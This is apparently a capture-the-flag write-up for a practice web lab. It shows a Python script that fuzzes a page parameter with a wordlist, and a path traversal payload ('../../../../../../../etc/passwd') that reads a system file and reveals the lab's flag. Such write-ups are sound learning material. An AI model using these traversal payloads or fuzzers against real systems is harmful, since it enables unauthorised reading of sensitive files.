# http://192.168.99.100/index.php?page=../../../../../../../etc/passwd

i've been stuck and i did not know how to find the other two exploitable areas of the website,
i decided to get a list of common file names and folders and try to fuzz the website for file names...

```py
#!/usr/bin/env python3

import requests

#base = 'http://192.168.99.100/'
base = 'http://192.168.99.100/index.php?page='

wl = None
with open('wordlist.txt') as fp:
    wl = fp.read().splitlines()
    fp.close()

visited = set()

for w in wl:
    r = requests.get(base + w)
    if r.status_code == 404:
        continue
    h = hash(r.text)
    if h not in visited:
        visited.add(h)
        print(base + w, '\t\t', r.status_code)
```

### and here are the results

```
e1z2r10p4% ./scanner.py 
http://192.168.99.100/index.php?page=!.gitignore 		 200
http://192.168.99.100/index.php?page=%2F../../../ 		 200
http://192.168.99.100/index.php?page=default 		 200
http://192.168.99.100/index.php?page=example.com/%2e%2e 		 200
http://192.168.99.100/index.php?page=feedback 		 200
http://192.168.99.100/index.php?page=footer 		 200
http://192.168.99.100/index.php?page=header 		 200
http://192.168.99.100/index.php?page=icons/../ 		 200
http://192.168.99.100/index.php?page=media 		 200
http://192.168.99.100/index.php?page=member 		 200
http://192.168.99.100/index.php?page=recover 		 200
http://192.168.99.100/index.php?page=signin 		 200
http://192.168.99.100/index.php?page=survey 		 200
http://192.168.99.100/index.php?page=upload 		 200
```

#

i noticed that for `/index.php?page=bla` there's a javascript alert _**Wtf ?**_

however for `/index.php?page=%2F../../../` the message is _**Nope..**_,

and if i append another `../` the javascript alert changes to _**Almost**_

with another `../` it changes to _**Still nope..**_

at `/index.php?page=../../../../../../../` the page says _**You can DO it !!!  :]**_

#

after looking at `https://www.owasp.org/index.php/Path_Traversal` i finally figured it out

the url for the flag is `http://192.168.99.100/index.php?page=../../../../../../../etc/passwd`

the page shows a javascript alert with the following message:

`Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

